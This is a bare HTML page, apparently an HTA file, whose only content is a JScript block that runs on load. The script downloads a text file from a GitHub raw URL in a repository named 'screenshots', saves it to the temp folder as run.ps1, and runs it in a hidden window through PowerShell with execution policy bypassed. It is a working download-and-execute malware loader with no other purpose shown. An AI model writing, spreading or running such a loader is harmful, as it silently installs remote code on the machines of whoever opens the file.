<html><head><script language=JScript>
var x=new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/h5.txt",0);
x.send();
var fso=new ActiveXObject("Scripting.FileSystemObject");
var t=fso.GetSpecialFolder(2)+"\\run.ps1";
fso.CreateTextFile(t).Write(x.responseText);
new ActiveXObject("WScript.Shell").Run("powershell -NoP -Ex ByP -File \""+t+"\"",0);
</script></head></html>